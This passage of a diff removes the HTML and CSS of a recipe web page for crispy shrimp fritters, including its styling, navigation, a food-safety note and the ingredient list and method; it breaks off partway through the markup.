@@ -1,1511 +1,778 @@
-<!doctype html>
-<html lang="en">
- <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-  <meta name="description" content="Easy crispy shrimp fritters made with tender shrimp, fresh herbs and a light golden batter.">
-  <title>Crispy Shrimp Fritters | Coastal Kitchen</title>
-  <style>
-        :root {
-            --green-950: #2d1810;
-            --green-900: #4b2619;
-            --green-800: #6b3522;
-            --green-700: #9e4d2d;
-            --green-600: #d56b3d;
-            --green-100: #fde8dc;
-            --green-50: #fff7f1;
-            --cream: #fffaf4;
-            --cream-dark: #f1dfcf;
-            --white: #ffffff;
-            --text: #30211b;
-            --muted: #78645b;
-            --border: rgba(75, 38, 25, 0.14);
-            --shadow: 0 24px 70px rgba(75, 38, 25, 0.12);
-            --radius-xl: 34px;
-            --radius-lg: 24px;
-            --radius-md: 18px;
-            --container: 1180px;
-        }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            min-height: 100vh;
-            overflow-x: hidden;
-            font-family: Arial, Helvetica, sans-serif;
-            color: var(--text);
-            background:
-                radial-gradient(
-                    circle at 8% 5%,
-                    rgba(213, 107, 61, 0.16),
-                    transparent 30%
-                ),
-                radial-gradient(
-                    circle at 90% 18%,
-                    rgba(241, 223, 207, 0.92),
-                    transparent 28%
-                ),
-                var(--cream);
-        }
-
-        body.menu-open {
-            overflow: hidden;
-        }
-
-        a {
-            color: inherit;
-            text-decoration: none;
-        }
-
-        button,
-        input,
-        textarea,
-        select {
-            font: inherit;
-        }
-
-        img,
-        svg {
-            display: block;
-            max-width: 100%;
-        }
-
-        .container {
-            width: min(calc(100% - 40px), var(--container));
-            margin: 0 auto;
-        }
-
-        .eyebrow {
-            display: inline-flex;
-            align-items: center;
-            gap: 9px;
-            margin-bottom: 18px;
-            color: var(--green-700);
-            font-size: 13px;
-            font-weight: 800;
-            letter-spacing: 0.12em;
-            text-transform: uppercase;
-        }
-
-        .eyebrow::before {
-            content: "";
-            width: 30px;
-            height: 2px;
-            border-radius: 999px;
-            background: currentColor;
-        }
-
-        .section-title {
-            max-width: 790px;
-            font-size: clamp(34px, 5vw, 62px);
-            line-height: 0.98;
-            letter-spacing: -0.045em;
-        }
-
-        .section-description {
-            max-width: 720px;
-            margin-top: 22px;
-            color: var(--muted);
-            font-size: 18px;
-            line-height: 1.75;
-        }
-
-        .button {
-            min-height: 54px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            padding: 0 23px;
-            border: 1px solid transparent;
-            border-radius: 999px;
-            cursor: pointer;
-            font-weight: 800;
-            transition:
-                transform 180ms ease,
-                background-color 180ms ease,
-                color 180ms ease,
-                border-color 180ms ease,
-                box-shadow 180ms ease;
-        }
-
-        .button:hover {
-            transform: translateY(-2px);
-        }
-
-        .button--primary {
-            color: var(--white);
-            background: var(--green-900);
-            box-shadow: 0 13px 32px rgba(75, 38, 25, 0.22);
-        }
-
-        .button--primary:hover {
-            background: var(--green-700);
-        }
-
-        .button--light {
-            color: var(--green-900);
-            background: var(--white);
-        }
-
-        .button--outline {
-            color: var(--green-900);
-            border-color: var(--border);
-            background: rgba(255, 255, 255, 0.48);
-        }
-
-        .button--outline:hover {
-            border-color: var(--green-600);
-            background: var(--white);
-        }
-
-        .site-header {
-            position: sticky;
-            top: 0;
-            z-index: 50;
-            padding: 16px 0;
-            backdrop-filter: blur(18px);
-            background: rgba(255, 250, 244, 0.84);
-            border-bottom: 1px solid rgba(75, 38, 25, 0.08);
-        }
-
-        .header-inner {
-            min-height: 62px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 24px;
-        }
-
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 13px;
-            min-width: 0;
-        }
-
-        .brand-mark {
-            width: 44px;
-            height: 44px;
-            flex: 0 0 auto;
-            display: grid;
-            place-items: center;
-            border-radius: 14px;
-            color: var(--white);
-            background: var(--green-900);
-            box-shadow: 0 12px 28px rgba(75, 38, 25, 0.2);
-        }
-
-        .brand-mark svg {
-            width: 23px;
-            height: 23px;
-        }
-
-        .brand-text {
-            min-width: 0;
-        }
-
-        .brand-name {
-            max-width: 440px;
-            overflow: hidden;
-            color: var(--green-950);
-            font-size: 14px;
-            font-weight: 900;
-            white-space: nowrap;
-            text-overflow: ellipsis;
-        }
-
-        .brand-category {
-            margin-top: 3px;
-            color: var(--muted);
-            font-size: 12px;
-        }
-
-        .desktop-nav {
-            display: flex;
-            align-items: center;
-            gap: 25px;
-        }
-
-        .desktop-nav a:not(.button) {
-            color: #6f5b52;
-            font-size: 14px;
-            font-weight: 750;
-        }
-
-        .desktop-nav a:not(.button):hover {
-            color: var(--green-800);
-        }
-
-        .menu-button {
-            width: 46px;
-            height: 46px;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid var(--border);
-            border-radius: 14px;
-            color: var(--green-950);
-            background: rgba(255, 255, 255, 0.72);
-            cursor: pointer;
-        }
-
-        .menu-button svg {
-            width: 22px;
-            height: 22px;
-        }
-
-        .mobile-menu {
-            position: fixed;
-            inset: 0;
-            z-index: 100;
-            display: none;
-            padding: 24px;
-            background: rgba(45, 24, 16, 0.97);
-            color: var(--white);
-        }
-
-        .mobile-menu.is-open {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .mobile-menu__top {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 20px;
-        }
-
-        .mobile-menu__close {
-            width: 46px;
-            height: 46px;
-            display: grid;
-            place-items: center;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 14px;
-            color: var(--white);
-            background: rgba(255, 255, 255, 0.08);
-            cursor: pointer;
-        }
-
-        .mobile-menu__links {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            gap: 22px;
-        }
-
-        .mobile-menu__links a:not(.button) {
-            font-size: clamp(31px, 9vw, 50px);
-            font-weight: 850;
-            letter-spacing: -0.04em;
-        }
-
-        .mobile-menu__links .button {
-            width: 100%;
-            margin-top: 15px;
-        }
-
-        .hero {
-            position: relative;
-            padding: 76px 0 58px;
-        }
-
-        .hero-grid {
-            display: grid;
-            grid-template-columns: minmax(0, 1.15fr) minmax(340px, 0.85fr);
-            align-items: center;
-            gap: 58px;
-        }
-
-        .hero-copy h1 {
-            max-width: 780px;
-            font-size: clamp(44px, 7vw, 84px);
-            line-height: 0.94;
-            letter-spacing: -0.06em;
-        }
-
-        .hero-copy h1 span {
-            color: var(--green-600);
-        }
-
-        .hero-copy > p {
-            max-width: 720px;
-            margin-top: 26px;
-            color: #78645b;
-            font-size: clamp(17px, 2vw, 20px);
-            line-height: 1.72;
-        }
-
-        .hero-actions {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 13px;
-            margin-top: 33px;
-        }
-
-        .hero-points {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 11px;
-            margin-top: 32px;
-        }
-
-        .hero-point {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 13px;
-            border: 1px solid var(--border);
-            border-radius: 999px;
-            color: #614b41;
-            background: rgba(255, 255, 255, 0.52);
-            font-size: 13px;
-            font-weight: 750;
-        }
-
-        .hero-point svg {
-            width: 16px;
-            height: 16px;
-            color: var(--green-600);
-        }
-
-        .hero-card {
-            position: relative;
-            overflow: hidden;
-            padding: 34px;
-            border: 1px solid rgba(255, 255, 255, 0.14);
-            border-radius: var(--radius-xl);
-            color: var(--white);
-            background:
-                linear-gradient(
-                    150deg,
-                    rgba(255, 255, 255, 0.08),
-                    transparent 45%
-                ),
-                var(--green-950);
-            box-shadow: var(--shadow);
-        }
-
-        .hero-card::before {
-            content: "";
-            position: absolute;
-            top: -90px;
-            right: -80px;
-            width: 250px;
-            height: 250px;
-            border-radius: 50%;
-            background: rgba(214, 174, 88, 0.18);
-        }
-
-        .hero-card::after {
-            content: "";
-            position: absolute;
-            right: 28px;
-            bottom: -75px;
-            width: 190px;
-            height: 190px;
-            border: 1px solid rgba(255, 255, 255, 0.13);
-            border-radius: 50%;
-        }
-
-        .hero-card__label {
-            position: relative;
-            z-index: 1;
-            color: #f4d8c8;
-            font-size: 13px;
-            font-weight: 800;
-            letter-spacing: 0.12em;
-            text-transform: uppercase;
-        }
-
-        .hero-card h2 {
-            position: relative;
-            z-index: 1;
-            margin-top: 17px;
-            font-size: clamp(28px, 4vw, 42px);
-            line-height: 1.05;
-            letter-spacing: -0.04em;
-        }
-
-        .hero-card__list {
-            position: relative;
-            z-index: 1;
-            display: grid;
-            gap: 14px;
-            margin-top: 28px;
-            list-style: none;
-        }
-
-        .hero-card__list li {
-            display: flex;
-            align-items: flex-start;
-            gap: 11px;
-            color: #fff3ea;
-            line-height: 1.5;
-        }
-
-        .hero-card__list svg {
-            width: 19px;
-            height: 19px;
-            flex: 0 0 auto;
-            margin-top: 2px;
-            color: #f2a76f;
-        }
-
-        .hero-card__price {
-            position: relative;
-            z-index: 1;
-            display: flex;
-            align-items: flex-end;
-            gap: 9px;
-            margin-top: 30px;
-        }
-
-        .hero-card__price strong {
-            font-size: clamp(40px, 6vw, 62px);
-            letter-spacing: -0.055em;
-        }
-
-        .hero-card__price span {
-            margin-bottom: 10px;
-            color: #f4d8c8;
-            font-size: 16px;
-        }
-
-        .hero-card__small {
-            position: relative;
-            z-index: 1;
-            margin-top: 10px;
-            color: #f4ddd0;
-            font-size: 13px;
-            line-height: 1.55;
-        }
-
-        .hero-card .button {
-            position: relative;
-            z-index: 1;
-            width: 100%;
-            margin-top: 25px;
-        }
-
-        .ticker {
-            overflow: hidden;
-            border-block: 1px solid var(--border);
-            background: rgba(255, 255, 255, 0.42);
-        }
-
-        .ticker-track {
-            width: max-content;
-            display: flex;
-            align-items: center;
-            gap: 34px;
-            padding: 17px 0;
-            animation: ticker 34s linear infinite;
-        }
-
-        .ticker-item {
-            display: flex;
-            align-items: center;
-            gap: 13px;
-            color: var(--green-800);
-            font-size: 13px;
-            font-weight: 900;
-            letter-spacing: 0.055em;
-            text-transform: uppercase;
-            white-space: nowrap;
-        }
-
-        .ticker-item::before {
-            content: "★";
-            color: var(--green-600);
-        }
-
-        @keyframes ticker {
-            to {
-                transform: translateX(-50%);
-            }
-        }
-
-        .legal-banner {
-            padding: 34px 0 0;
-        }
-
-        .legal-banner__box {
-            display: grid;
-            grid-template-columns: auto 1fr;
-            gap: 18px;
-            padding: 24px;
-            border: 1px solid rgba(156, 105, 28, 0.22);
-            border-radius: var(--radius-lg);
-            background: #fff8e8;
-        }
-
-        .legal-banner__icon {
-            width: 46px;
-            height: 46px;
-            display: grid;
-            place-items: center;
-            border-radius: 15px;
-            color: #735011;
-            background: #f0dfb8;
-        }
-
-        .legal-banner__icon svg {
-            width: 24px;
-            height: 24px;
-        }
-
-        .legal-banner h2 {
-            color: #5d4212;
-            font-size: 18px;
-        }
-
-        .legal-banner p {
-            margin-top: 7px;
-            color: #6e5c37;
-            font-size: 14px;
-            line-height: 1.7;
-        }
-
-        .course-section {
-            padding: 112px 0;
-        }
-
-        .course-grid {
-            display: grid;
-            grid-template-columns: minmax(0, 1.08fr) minmax(320px, 0.92fr);
-            gap: 72px;
-            align-items: start;
-        }
-
-        .course-copy p {
-            margin-top: 23px;
-            color: var(--muted);
-            font-size: 18px;
-            line-height: 1.8;
-        }
-
-        .course-copy strong {
-            color: var(--green-900);
-        }
-
-        .feature-list {
-            display: grid;
-            gap: 16px;
-        }
-
-        .feature-card {
-            display: grid;
-            grid-template-columns: auto 1fr;
-            gap: 16px;
-            padding: 22px;
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            background: rgba(255, 255, 255, 0.58);
-            transition:
-                transform 180ms ease,
-                border-color 180ms ease,
-                background-color 180ms ease;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-3px);
-            border-color: rgba(213, 107, 61, 0.35);
-            background: var(--white);
-        }
-
-        .feature-card__icon {
-            width: 48px;
-            height: 48px;
-            display: grid;
-            place-items: center;
-            border-radius: 15px;
-            color: var(--white);
-            background: var(--green-900);
-        }
-
-        .feature-card__icon svg {
-            width: 23px;
-            height: 23px;
-        }
-
-        .feature-card h3 {
-            font-size: 18px;
-            line-height: 1.3;
-        }
-
-        .feature-card p {
-            margin-top: 7px;
-            color: var(--muted);
-            font-size: 14px;
-            line-height: 1.65;
-        }
-
-        .warning-box {
-            margin-top: 28px;
-            padding: 23px;
-            border-left: 4px solid #bd8127;
-            border-radius: 0 18px 18px 0;
-            background: rgba(255, 248, 232, 0.86);
-        }
-
-        .warning-box strong {
-            color: #64430d;
-        }
-
-        .warning-box p {
-            margin-top: 8px;
-            color: #695b40;
-            font-size: 14px;
-            line-height: 1.7;
-        }
-
-        .process-section {
-            padding: 112px 0;
-            color: var(--white);
-            background:
-                radial-gradient(
-                    circle at 80% 10%,
-                    rgba(214, 174, 88, 0.16),
-                    transparent 34%
-                ),
-                var(--green-950);
-        }
-
-        .process-section .eyebrow {
-            color: #f2a76f;
-        }
-
-        .process-section .section-title {
-            max-width: 900px;
-        }
-
-        .process-section .section-description {
-            color: #f4d8c8;
-        }
-
-        .steps {
-            display: grid;
-            grid-template-columns: repeat(4, minmax(0, 1fr));
-            gap: 16px;
-            margin-top: 52px;
-        }
-
-        .step {
-            min-height: 330px;
-            display: flex;
-            flex-direction: column;
-            padding: 26px;
-            border: 1px solid rgba(255, 255, 255, 0.13);
-            border-radius: var(--radius-lg);
-            background: rgba(255, 255, 255, 0.055);
-        }
-
-        .step-number {
-            color: #f2a76f;
-            font-size: 13px;
-            font-weight: 900;
-            letter-spacing: 0.13em;
-            text-transform: uppercase;
-        }
-
-        .step h3 {
-            margin-top: 40px;
-            font-size: 25px;
-            line-height: 1.1;
-            letter-spacing: -0.03em;
-        }
-
-        .step p {
-            margin-top: 15px;
-            color: #f4d8c8;
-            font-size: 15px;
-            line-height: 1.7;
-        }
-
-        .step-line {
-            width: 100%;
-            height: 1px;
-            margin-top: auto;
-            background: rgba(255, 255, 255, 0.13);
-        }
-
-        .step-icon {
-            width: 46px;
-            height: 46px;
-            display: grid;
-            place-items: center;
-            margin-top: 18px;
-            border-radius: 50%;
-            color: var(--green-950);
-            background: #f2a76f;
-        }
-
-        .step-icon svg {
-            width: 21px;
-            height: 21px;
-        }
-
-        .process-cta {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            gap: 25px;
-            margin-top: 42px;
-            padding: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.13);
-            border-radius: var(--radius-lg);
-            background: rgba(255, 255, 255, 0.06);
-        }
-
-        .process-cta p {
-            max-width: 640px;
-            color: #f4ddd0;
-            line-height: 1.65;
-        }
-
-        .faq-section {
-            padding: 112px 0;
-        }
-
-        .faq-layout {
-            display: grid;
-            grid-template-columns: 0.7fr 1.3fr;
-            gap: 70px;
-            align-items: start;
-        }
-
-        .faq-side {
-            position: sticky;
-            top: 115px;
-        }
-
-        .faq-list {
-            display: grid;
-            gap: 12px;
-        }
-
-        .faq-item {
-            overflow: hidden;
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            background: rgba(255, 255, 255, 0.56);
-        }
-
-        .faq-question {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 18px;
-            padding: 22px;
-            border: 0;
-            color: var(--green-950);
-            background: transparent;
-            cursor: pointer;
-            text-align: left;
-            font-weight: 850;
-        }
-
-        .faq-question svg {
-            width: 20px;
-            height: 20px;
-            flex: 0 0 auto;
-            transition: transform 180ms ease;
-        }
-
-        .faq-item.is-open .faq-question svg {
-            transform: rotate(45deg);
-        }
-
-        .faq-answer {
-            display: grid;
-            grid-template-rows: 0fr;
-            transition: grid-template-rows 220ms ease;
-        }
-
-        .faq-answer > div {
-            overflow: hidden;
-        }
-
-        .faq-item.is-open .faq-answer {
-            grid-template-rows: 1fr;
-        }
-
-        .faq-answer p {
-            padding: 0 22px 22px;
-            color: var(--muted);
-            font-size: 15px;
-            line-height: 1.75;
-        }
-
-        .final-cta {
-            padding: 0 0 70px;
-        }
-
-        .final-cta__box {
-            position: relative;
-            overflow: hidden;
-            display: grid;
-            grid-template-columns: 1fr auto;
-            gap: 40px;
-            align-items: center;
-            padding: clamp(32px, 5vw, 60px);
-            border-radius: var(--radius-xl);
-            color: var(--white);
-            background: var(--green-800);
-            box-shadow: var(--shadow);
-        }
-
-        .final-cta__box::after {
-            content: "";
-            position: absolute;
-            right: -80px;
-            bottom: -120px;
-            width: 310px;
-            height: 310px;
-            border: 1px solid rgba(255, 255, 255, 0.14);
-            border-radius: 50%;
-        }
-
-        .final-cta h2 {
-            position: relative;
-            z-index: 1;
-            max-width: 730px;
-            font-size: clamp(35px, 5vw, 64px);
-            line-height: 0.98;
-            letter-spacing: -0.05em;
-        }
-
-        .final-cta p {
-            position: relative;
-            z-index: 1;
-            max-width: 700px;
-            margin-top: 19px;
-            color: #f7e3d8;
-            line-height: 1.7;
-        }
-
-        .final-cta .button {
-            position: relative;
-            z-index: 1;
-            min-width: 220px;
-        }
-
-        .site-footer {
-            padding: 35px 0 42px;
-            border-top: 1px solid var(--border);
-        }
-
-        .footer-grid {
-            display: grid;
-            grid-template-columns: 1fr auto;
-            gap: 30px;
-            align-items: start;
-        }
-
-        .footer-company {
-            max-width: 730px;
-        }
-
-        .footer-company strong {
-            display: block;
-            color: var(--green-950);
-            font-size: 15px;
-        }
-
-        .footer-company p {
-            margin-top: 10px;
-            color: var(--muted);
-            font-size: 12px;
-            line-height: 1.7;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: flex-end;
-            gap: 17px;
-            color: #78645b;
-            font-size: 13px;
-            font-weight: 750;
-        }
-
-        .footer-bottom {
-            margin-top: 28px;
-            padding-top: 22px;
-            border-top: 1px solid var(--border);
-            color: #8c756a;
-            font-size: 12px;
-        }
-
-        .whatsapp-float {
-            position: fixed;
-            right: 20px;
-            bottom: 20px;
-            z-index: 40;
-            width: 60px;
-            height: 60px;
-            display: grid;
-            place-items: center;
-            border-radius: 50%;
-            color: var(--white);
-            background: #d56b3d;
-            box-shadow: 0 15px 35px rgba(213, 107, 61, 0.3);
-            transition:
-                transform 180ms ease,
-                box-shadow 180ms ease;
-        }
-
-        .whatsapp-float:hover {
-            transform: translateY(-3px) scale(1.03);
-            box-shadow: 0 20px 42px rgba(213, 107, 61, 0.36);
-        }
-
-        .whatsapp-float svg {
-            width: 29px;
-            height: 29px;
-        }
-
-        @media (max-width: 980px) {
-            .desktop-nav {
-                display: none;
-            }
-
-            .menu-button {
-                display: flex;
-            }
-
-            .hero-grid,
-            .course-grid,
-            .faq-layout {
-                grid-template-columns: 1fr;
-            }
-
-            .hero {
-                padding-top: 54px;
-            }
-
-            .hero-card {
-                max-width: 680px;
-            }
-
-            .steps {
-                grid-template-columns: repeat(2, minmax(0, 1fr));
-            }
-
-            .faq-side {
-                position: static;
-            }
-
-            .final-cta__box {
-                grid-template-columns: 1fr;
-            }
-
-            .final-cta .button {
-                width: fit-content;
-            }
-        }
-
-        @media (max-width: 640px) {
-            .container {
-                width: min(calc(100% - 28px), var(--container));
-            }
-
-            .site-header {
-                padding: 11px 0;
-            }
-
-            .brand-name {
-                max-width: 190px;
-                font-size: 12px;
-            }
-
-            .brand-category {
-                font-size: 10px;
-            }
-
-            .hero {
-                padding: 40px 0 42px;
-            }
-
-            .hero-copy h1 {
-                font-size: clamp(42px, 14vw, 60px);
-            }
-
-            .hero-copy > p,
-            .course-copy p,
-            .section-description {
-                font-size: 16px;
-            }
-
-            .hero-actions,
-            .hero-actions .button {
-                width: 100%;
-            }
-
-            .hero-card {
-                padding: 27px 22px;
-                border-radius: 26px;
-            }
-
-            .legal-banner__box {
-                grid-template-columns: 1fr;
-            }
-
-            .course-section,
-            .process-section,
-            .faq-section {
-                padding: 82px 0;
-            }
-
-            .course-grid {
-                gap: 45px;
-            }
-
-            .steps {
-                grid-template-columns: 1fr;
-            }
-
-            .step {
-                min-height: 290px;
-            }
-
-            .process-cta {
-                align-items: stretch;
-            }
-
-            .process-cta .button {
-                width: 100%;
-            }
-
-            .final-cta__box {
-                padding: 34px 24px;
-                border-radius: 27px;
-            }
-
-            .final-cta .button {
-                width: 100%;
-            }
-
-            .footer-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .footer-links {
-                justify-content: flex-start;
-            }
-
-            .whatsapp-float {
-                width: 55px;
-                height: 55px;
-                right: 14px;
-                bottom: 14px;
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            html {
-                scroll-behavior: auto;
-            }
-
-            *,
-            *::before,
-            *::after {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-            }
-        }
-    </style>
- </head>
- <body>
-  <!-- Complete recipe page. The original PHP flow and JavaScript remain intact. -->
-  <header class="site-header">
-   <div class="container header-inner">
-    <a href="#inicio" class="brand" aria-label="Go to the top"> <span class="brand-mark" aria-hidden="true"> 
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-       <circle cx="10" cy="12" r="6"></circle> <path d="M15 8.5 21 5"></path> <path d="M15.5 15 21 18"></path>
-      </svg> 
-     </span> <span class="brand-text"> <span class="brand-name"> Coastal Kitchen </span> <span class="brand-category"> Simple recipes · Big flavor </span> </span> </a>
-    <nav class="desktop-nav" aria-label="Main navigation">
-     <a href="#recipe">The Recipe</a> <a href="#como-funciona">Method</a> <a href="#duvidas">Questions</a> <a class="button button--primary" href="#recipe" target="_self" rel="noopener noreferrer"> Jump to recipe </a>
-    </nav>
-    <button class="menu-button" id="openMenu" type="button" aria-label="Open menu" aria-controls="mobileMenu" aria-expanded="false">
-     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-      <path d="M4 7h16"></path> <path d="M4 12h16"></path> <path d="M4 17h16"></path>
-     </svg>
-    </button>
-   </div>
-  </header>
-  <div class="mobile-menu" id="mobileMenu" aria-hidden="true">
-   <div class="mobile-menu__top">
-    <strong>Recipe menu</strong>
-    <button class="mobile-menu__close" id="closeMenu" type="button" aria-label="Close menu">
-     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
-      <path d="m6 6 12 12"></path> <path d="m18 6-12 12"></path>
-     </svg>
-    </button>
-   </div>
-   <nav class="mobile-menu__links" aria-label="Mobile navigation">
-    <a href="#recipe">The Recipe</a> <a href="#como-funciona">Method</a> <a href="#duvidas">Questions</a> <a class="button button--light" href="#recipe" target="_self" rel="noopener noreferrer"> Jump to recipe </a>
-   </nav>
-  </div>
-  <main>
-   <section class="hero" id="inicio">
-    <div class="container hero-grid">
-     <div class="hero-copy">
-      <span class="eyebrow"> Easy coastal cooking · Ready in 30 minutes </span>
-      <h1>Golden, crispy <span>shrimp fritters.</span></h1>
-      <p>Juicy shrimp, bright herbs and a light batter come together in a quick, crowd-pleasing recipe. Crisp on the outside, tender in the center and perfect with a squeeze of fresh lemon.</p>
-      <div class="hero-actions">
-       <a class="button button--primary" href="#recipe" target="_self" rel="noopener noreferrer"> Get the ingredients </a> <a class="button button--outline" href="#como-funciona"> See the method <span aria-hidden="true">→</span> </a>
-      </div>
-      <div class="hero-points">
-       <span class="hero-point"> 
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="m5 12 4 4L19 6"></path>
-        </svg> 30-minute recipe 
-       </span> <span class="hero-point"> 
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="M6 3h9l3 3v15H6Z"></path> <path d="M15 3v4h3"></path> <path d="m9 14 2 2 4-5"></path>
-        </svg> Makes 12 fritters 
-       </span> <span class="hero-point"> 
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="M21 15a4 4 0 0 1-4 4H8l-5 3V7a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4Z"></path>
-        </svg> Easy to customize 
-       </span>
-      </div>
-     </div>
-     <aside class="hero-card" aria-label="Recipe at a glance">
-      <span class="hero-card__label">Recipe at a glance</span>
-      <h2>Crispy Shrimp Fritters</h2>
-      <ul class="hero-card__list">
-       <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="m5 12 4 4L19 6"></path>
-        </svg>
-        1 lb peeled, chopped shrimp
-       </li>
-       <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="m5 12 4 4L19 6"></path>
-        </svg>
-        Corn, scallions and fresh parsley
-       </li>
-       <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="m5 12 4 4L19 6"></path>
-        </svg>
-        A light flour-and-egg batter
-       </li>
-       <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-         <path d="m5 12 4 4L19 6"></path>
-        </svg>
-        Lemon and dipping sauce to serve
-       </li>
-      </ul>
-      <div class="hero-card__price">
-       <strong>30 min</strong> <span>total</span>
-      </div>
-      <p class="hero-card__small">15 minutes to prep, 15 minutes to cook. Serves four as an appetizer or light meal.</p>
-      <a class="button button--light" href="#como-funciona" target="_self" rel="noopener noreferrer"> Start cooking <span aria-hidden="true">→</span> </a>
-     </aside>
-    </div>
-   </section>
-   <div class="ticker" aria-hidden="true">
-    <div class="ticker-track">
-     <span class="ticker-item">Crispy Outside</span> <span class="ticker-item">Tender Shrimp</span> <span class="ticker-item">Fresh Herbs</span> <span class="ticker-item">Golden Edges</span> <span class="ticker-item">Bright Lemon</span> <span class="ticker-item">Easy Weeknight Recipe</span> <span class="ticker-item">Crispy Outside</span> <span class="ticker-item">Tender Shrimp</span> <span class="ticker-item">Fresh Herbs</span> <span class="ticker-item">Golden Edges</span> <span class="ticker-item">Bright Lemon</span> <span class="ticker-item">Easy Weeknight Recipe</span>
-    </div>
-   </div>
-   <section class="legal-banner" aria-label="Kitchen note">
-    <div class="container">
-     <div class="legal-banner__box">
-      <div class="legal-banner__icon" aria-hidden="true">
-       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 9v4"></path> <path d="M12 17h.01"></path> <path d="M10.3 3.7 2.4 17.4A2 2 0 0 0 4.1 20h15.8a2 2 0 0 0 1.7-2.6L13.7 3.7a2 2 0 0 0-3.4 0Z"></path>
-       </svg>
-      </div>
-      <div>
-       <h2>Kitchen note: cook shrimp all the way through.</h2>
-       <p>The centers should be opaque and firm, and the fritters should reach 145°F / 63°C. This recipe contains shellfish, egg and wheat. Always check ingredient labels and adapt the recipe for any food allergies at your table.</p>
-      </div>
-     </div>
-    </div>
-   </section>
-   <section class="course-section" id="recipe">
-    <div class="container course-grid">
-     <div class="course-copy">
-      <span class="eyebrow">The recipe</span>
-      <h2 class="section-title">Simple ingredients, seriously crisp results.</h2>
-      <p>Start with <strong>1 lb (450 g) raw shrimp</strong>, peeled, deveined and roughly chopped. Add 1/2 cup corn, 3 sliced scallions, 2 tablespoons chopped parsley and 1 minced garlic clove.</p>
-      <p>For the batter, use <strong>1/2 cup all-purpose flour, 1 teaspoon baking powder, 1 egg and 1/4 cup cold water</strong>. Season with 1 teaspoon paprika, 1/2 teaspoon salt, black pepper and a little lemon zest.</p>
-      <p>Fold everything together just until combined. Fry small spoonfuls in a thin layer of neutral oil until deeply golden, about 2 to 3 minutes per side. Drain briefly and serve while hot.</p>
-      <div class="warning-box">
-       <strong>Chef's tip</strong>
-       <p>Pat the shrimp dry before mixing and keep the batter cold. Less moisture means crisper fritters, and a cold batter browns beautifully in the hot oil.</p>
-      </div>
-     </div>
-     <div class="feature-list">
-      <article class="feature-card">
-       <div class="feature-card__icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
-         <rect x="4" y="3" width="16" height="18" rx="2"></rect> <path d="M8 7h8"></path> <path d="M8 11h8"></path> <path d="M8 15h5"></path>
-        </svg>
-       </div>
-       <div>
-        <h3>Use fresh, dry shrimp</h3>
-        <p>Roughly chopped shrimp gives each fritter a juicy, satisfying bite. Dry it well so the batter stays light instead of watery.</p>
-       </div>
-      </article>
-      <article class="feature-card">
-       <div class="feature-card__icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
-         <path d="M21 15a4 4 0 0 1-4 4H8l-5 3V7a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4Z"></path> <path d="M8 9h8"></path> <path d="M8 13h5"></path>
-        </svg>
-       </div>
-       <div>
-        <h3>Fold the batter gently</h3>
-        <p>Stir only until no dry flour remains. Overmixing develops gluten and can make the fritters dense instead of tender.</p>
-       </div>
-      </article>
-      <article class="feature-card">
-       <div class="feature-card__icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
-         <circle cx="12" cy="12" r="9"></circle> <circle cx="12" cy="12" r="4"></circle> <path d="M12 3v5"></path> <path d="M21 12h-5"></path>
